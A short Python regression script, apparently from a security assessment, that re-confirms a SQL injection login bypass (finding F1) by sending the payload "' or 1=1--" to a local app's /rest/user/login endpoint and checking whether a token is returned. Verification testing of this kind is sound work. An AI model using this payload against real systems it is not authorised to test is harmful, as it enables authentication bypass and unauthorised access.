#!/usr/bin/env python3
"""
Re-confirms CA1 finding F1 (SQL injection authentication bypass) in a
scripted, repeatable way, without altering any data.

Sends the known payload to the login endpoint and checks whether an
authenticated (admin) session token is returned. This is a confirmation
check, not an exploitation tool: it performs exactly one login attempt and
does not attempt further access with the resulting token.

Usage:
    python scripts/sqli_check.py --base-url http://127.0.0.1:3000
"""
import argparse
import json
import sys

import requests

PAYLOAD_USERNAME = "' or 1=1--"
PAYLOAD_PASSWORD = "anything"


def check_sqli(base_url: str, timeout: float = 10.0) -> dict:
    url = f"{base_url.rstrip('/')}/rest/user/login"
    try:
        resp = requests.post(
            url,
            json={"email": PAYLOAD_USERNAME, "password": PAYLOAD_PASSWORD},
            timeout=timeout,
        )
    except requests.RequestException as exc:
        return {"check": "F1_sqli_login_bypass", "status": "ERROR", "detail": str(exc)}

    token_present = False
    try:
        body = resp.json()
        token_present = bool(body.get("authentication", {}).get("token"))
    except (ValueError, AttributeError):
        pass

    result = "FAIL (vulnerable)" if resp.status_code == 200 and token_present else "PASS (not reproduced)"
    return {
        "check": "F1_sqli_login_bypass",
        "status": result,
        "http_status": resp.status_code,
        "token_returned": token_present,
    }


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--base-url", default="http://127.0.0.1:3000")
    args = parser.parse_args()

    result = check_sqli(args.base_url)
    print(json.dumps(result, indent=2))
    sys.exit(0 if "PASS" in result["status"] else 1)
